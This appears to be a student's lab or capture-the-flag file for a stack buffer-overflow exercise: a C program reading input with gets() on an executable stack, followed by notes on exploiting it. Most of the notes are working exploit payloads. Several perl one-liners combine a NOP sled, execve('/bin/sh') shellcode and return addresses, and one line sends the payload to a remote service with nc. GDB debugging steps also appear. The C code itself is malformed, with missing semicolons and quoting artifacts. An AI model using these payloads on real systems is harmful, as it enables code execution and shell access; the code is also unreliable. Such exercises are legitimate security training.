#include <stdio.h>
#include <stdlib.h>

int g_var = 1999;

int main(int argc, char const *argv[]) {
    char buf[/* some size */]; // 8208 + 4 for iep (ret) - 4 (arg) -8 (argv)
    setbuf(stdout, NULL);
    // Now there',27h,'s no win function, but the stack is executable...
    puts("Now there',27h,'s no win function, but the stack is executable...\n") // printf
    // Time to break out your best shellcodez
    puts("Time to break out your best shellcodez\n") // printf
    gets(buf);
    return 0;
}

// issue with environment variables set in gdb and not on cmd

// cat <(perl -e 'print "\x90"x8135 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" . "\x60\xd6\xff\xff" x 10') - | nc 192.168.59.3 5004

// \x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68

// 8208
// 8216
r <<< $(perl -e 'print "\x90"x8158 . "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68" . "\x30\xbe\xff\xff"')

$(perl -e 'print "\x90"x8158 . "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68" . "\x30\xbe\xff\xff"')

(perl -e 'print "\x90"x8158 . "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68" . "\xd0\xb5\xff\xff"') | r

// use "env - " to remove environment variables...
// run program using ultimate path

// https://stackoverflow.com/questions/17775186/buffer-overflow-works-in-gdb-but-not-without-it
// https://security.stackexchange.com/questions/152964/exploit-does-not-work-outside-gdb

// GDB steps
// remove environment variables set by GDB
unset env
disas main // look at dissassembled binary
b *0x000000 // put a breakpoint after gets
show frame // get information about current frame
x/100x $sp // show 100 hex up starting at stack pointer


env - cat <(perl -e 'print "\x90"x8158 . "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68" . "\xd0\xbe\xff\xff"') - | env - /opt/comp6447/buffer-4/shellz
